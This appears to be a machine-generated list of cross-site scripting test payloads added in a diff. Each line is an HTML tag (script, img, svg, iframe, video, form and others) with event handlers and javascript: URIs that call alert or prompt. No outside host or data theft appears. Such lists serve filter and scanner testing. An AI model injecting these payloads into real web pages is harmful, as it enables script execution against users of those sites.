+<img Autoplay='javascript:alert(3)' Onselect='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<video Autoplay='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<script Onblur='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<script Onerror='alert(1)' Src='alert(1)' Href>alert()</script>
+<script Oninput='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<body Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<audio Autofocus='//google.com' Onload='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<form Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<input Only='javascript:alert(3)' Onblur='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onload='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video On='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<video Autofocus='//google.com' Onpaste='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<svg Onkeydown='alert(1)' Onmouseover='alert(1)' Popover>alert()</svg>
+<form Popover='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<audio On='//google.com' Onkeyup='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<audio On='//google.com' Oninput='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<iframe Onpaste='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<iframe Oninput='alert(1)' Src='alert(1)' On>alert()</iframe>
+<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<video On='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<video Only='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<body Only='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<iframe Onpaste='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<body Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<video Popover='//google.com' Onclick='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<audio Autoplay='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<svg Onclick='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<script Onkeydown='alert(1)' Src='alert(1)' On>alert()</script>
+<img Autoplay='javascript:alert(3)' Onpaste='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<video Href='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<audio Href='//google.com' Ontoggle='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<input On='javascript:alert(3)' Onload='alert(3)' Onfocus='alert(1)' Data-info='prompt(1)' />
+<svg Onkeyup='alert(1)' Onload='alert(1)' Only>alert()</svg>
+<input Href='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<body Href='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<img Only='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<input Href='javascript:alert(3)' Onfocus='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<input Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<iframe Onmouseover='alert(1)' Onload='alert(1)' Href>alert()</iframe>
+<input Only='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<iframe Onload='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<video Autofocus='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<iframe Onerror='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<script Onselect='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<audio Autoplay='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<form Href='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<input On='javascript:alert(3)' Onload='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<svg Onselect='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<script Onpaste='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<audio Only='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<form Href='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<audio On='//google.com' Onchange='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<iframe Onsubmit='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<iframe Oninput='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<audio Only='//google.com' Onblur='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<body Href='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<iframe Ontoggle='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<audio Href='//google.com' Onerror='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<iframe Onsubmit='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<body Only='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<script Onfocus='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<video Autoplay='//google.com' Onload='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<video Href='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<img On='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<video Popover='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<input Only='javascript:alert(3)' Onload='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<form Popover='javascript:alert(3)' Onload='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<video Autofocus='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<form Autofocus='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<form Autoplay='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<input Popover='javascript:alert(3)' Onblur='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<form Popover='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<svg Onblur='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<audio On='//google.com' Onload='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<img Popover='javascript:alert(3)' Onselect='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<video Autoplay='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<body Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<audio Href='//google.com' Onsubmit='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<img On='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<script Onselect='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<video Popover='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<svg Oninput='alert(1)' Onmouseover='alert(1)' Popover>alert()</svg>
+<svg Onload='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<video Only='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<audio On='//google.com' Onclick='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<svg Onchange='alert(1)' Onload='alert(1)' Autoplay>alert()</svg>
+<audio Href='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<script Onmouseover='alert(1)' Type='alert(1)' Href>alert()</script>
+<video Autoplay='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<audio Autoplay='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<form Autofocus='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<input Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<svg Onkeydown='alert(1)' Onmouseover='alert(1)' Popover>alert()</svg>
+<body Popover='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<form Only='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<video Autofocus='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<svg Onpaste='alert(1)' Onload='alert(1)' Only>alert()</svg>
+<input Popover='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<video On='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<body Only='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<form Autofocus='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<svg Onfocus='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<svg Onload='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<form Autoplay='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<svg Onmouseover='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<script Onerror='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<iframe Onkeydown='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<script Ontoggle='alert(1)' Type='alert(1)' Href>alert()</script>
+<img Href='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<video Popover='//google.com' Onchange='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<body On='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<img Autoplay='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<svg Onpaste='alert(1)' Style='alert(1)' On>alert()</svg>
+<img Only='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-custom='prompt(1)' />
+<script Onload='alert(1)' Type='alert(1)' Only>alert()</script>
+<input Popover='javascript:alert(3)' Onkeydown='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<input Only='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<svg Oninput='alert(1)' Onload='alert(1)' Autofocus>alert()</svg>
+<script Onfocus='alert(1)' Src='alert(1)' Only>alert()</script>
+<svg Onclick='alert(1)' Style='alert(1)' On>alert()</svg>
+<svg Onkeyup='alert(1)' Onload='alert(1)' On>alert()</svg>
+<video On='//google.com' Onload='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<audio On='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<video Autoplay='//google.com' Onselect='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<video Only='//google.com' Ontoggle='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<body On='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<script Onclick='alert(1)' Src='alert(1)' Only>alert()</script>
+<video On='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<input Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<audio Popover='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<svg Onclick='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<input Href='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<script Oninput='alert(1)' Type='alert(1)' Popover>alert()</script>
+<svg Ontoggle='alert(1)' Onload='alert(1)' Autofocus>alert()</svg>
+<script Onmouseover='alert(1)' Src='alert(1)' Only>alert()</script>
+<iframe Onpaste='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<svg Onclick='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<body Autofocus='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<input Href='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<audio Popover='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<video Autofocus='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<body Autofocus='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<svg Onselect='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<svg Onpaste='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<script Onpaste='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<img On='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<svg Oninput='alert(1)' Onload='alert(1)' Autofocus>alert()</svg>
+<iframe Onblur='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<img Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<script Onerror='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<script Ontoggle='alert(1)' Type='alert(1)' Href>alert()</script>
+<iframe Oninput='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<body Popover='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<video Href='//google.com' Onselect='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<video Autofocus='//google.com' Onclick='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<video Popover='//google.com' Onerror='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<audio Href='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<video Only='//google.com' Oninput='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<img Popover='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<script Onclick='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<video On='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<video Only='//google.com' Onclick='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<body Popover='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<script Onerror='alert(1)' Src='alert(1)' On>alert()</script>
+<script Onfocus='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<input Popover='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<script Onkeydown='alert(1)' Type='alert(1)' Popover>alert()</script>
+<video Href='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<body Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<script Onkeydown='alert(1)' Type='alert(1)' On>alert()</script>
+<svg Oninput='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<form Popover='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<input Autofocus='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<audio Href='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<body Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<audio Only='//google.com' Onpaste='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<audio Only='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<iframe Onclick='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<video Only='//google.com' Oninput='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<svg Ontoggle='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<form Popover='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<form Popover='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<form Href='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<script Onfocus='alert(1)' Src='alert(1)' Only>alert()</script>
+<script Onselect='alert(1)' Src='alert(1)' Popover>alert()</script>
+<img Popover='javascript:alert(3)' Onclick='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<script Oninput='alert(1)' Src='alert(1)' Popover>alert()</script>
+<img Only='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<img Autoplay='javascript:alert(3)' Onchange='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<img Popover='javascript:alert(3)' Onpaste='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<audio Autofocus='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<script Onchange='alert(1)' Type='alert(1)' Only>alert()</script>
+<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<svg Onload='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<iframe Onerror='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<form Only='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<audio Only='//google.com' Onkeydown='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<script Onclick='alert(1)' Src='alert(1)' Only>alert()</script>
+<iframe Ontoggle='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<video Autofocus='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<script Onkeyup='alert(1)' Type='alert(1)' On>alert()</script>
+<input Only='javascript:alert(3)' Onkeyup='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<svg Onsubmit='alert(1)' Onload='alert(1)' Only>alert()</svg>
+<form On='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<img On='javascript:alert(3)' Onclick='alert(3)' Src='alert(1)' Data-xss='prompt(1)' />
+<form On='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<img Only='javascript:alert(3)' Onkeyup='alert(3)' Src='alert(1)' Data-xss='prompt(1)' />
+<audio Href='//google.com' Oninput='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<iframe Onmouseover='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<body Href='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<form Popover='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<script Onload='alert(1)' Type='alert(1)' On>alert()</script>
+<svg Onpaste='alert(1)' Onload='alert(1)' Popover>alert()</svg>
+<svg Onload='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<body On='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<svg Onpaste='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<video Autofocus='//google.com' Onchange='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<form Only='javascript:alert(3)' Ontoggle='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<video Only='//google.com' Onchange='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<video Popover='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<svg Onerror='alert(1)' Onload='alert(1)' Popover>alert()</svg>
+<video Autoplay='//google.com' Onerror='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<body Autofocus='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<video Href='//google.com' Onsubmit='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<script Onload='alert(1)' Src='alert(1)' Only>alert()</script>
+<svg Ontoggle='alert(1)' Onmouseover='alert(1)' Popover>alert()</svg>
+<form Only='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<input Only='javascript:alert(3)' Onerror='alert(3)' Onfocus='alert(1)' Data-info='prompt(1)' />
+<iframe Onerror='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<audio On='//google.com' Oninput='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<iframe Oninput='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<input Autoplay='javascript:alert(3)' Onchange='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<input Only='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<iframe Onkeydown='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<form Autoplay='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<input Popover='javascript:alert(3)' Onkeyup='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<video On='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<video On='//google.com' Onload='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<form Href='javascript:alert(3)' Oninput='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<svg Onfocus='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<input Href='javascript:alert(3)' Onsubmit='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<img Popover='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<video Href='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<form Only='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<audio Href='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<form Popover='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<svg Onerror='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<body Only='javascript:alert(3)' Onclick='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<audio Only='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<svg Ontoggle='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<video Href='//google.com' Oninput='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<input On='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<form On='javascript:alert(3)' Onerror='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<body Popover='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<form Popover='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<video On='//google.com' Onkeyup='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<form Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' On>alert()</iframe>
+<iframe Onkeyup='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<input Autoplay='javascript:alert(3)' Oninput='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<audio Popover='//google.com' Onchange='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<script Onclick='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<video Only='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<form Autofocus='javascript:alert(3)' Onload='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<form On='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<input Popover='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<input On='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<input Only='javascript:alert(3)' Onfocus='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<video Href='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<img Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<body Only='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<iframe Onkeydown='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<body On='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<img Href='javascript:alert(3)' Onclick='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<img On='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<input Popover='javascript:alert(3)' Onkeyup='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<body On='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<audio Autoplay='//google.com' Onclick='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<form Popover='javascript:alert(3)' Onpaste='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<script Onpaste='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<input Only='javascript:alert(3)' Onclick='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<video On='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<img Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<audio Popover='//google.com' Onsubmit='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<audio On='//google.com' Oninput='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<body Popover='javascript:alert(3)' Onload='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<input Href='javascript:alert(3)' Onpaste='alert(3)' Value='alert(1)' Data-test='prompt(1)' />
+<form Only='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<body On='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<iframe Onselect='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<form Href='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
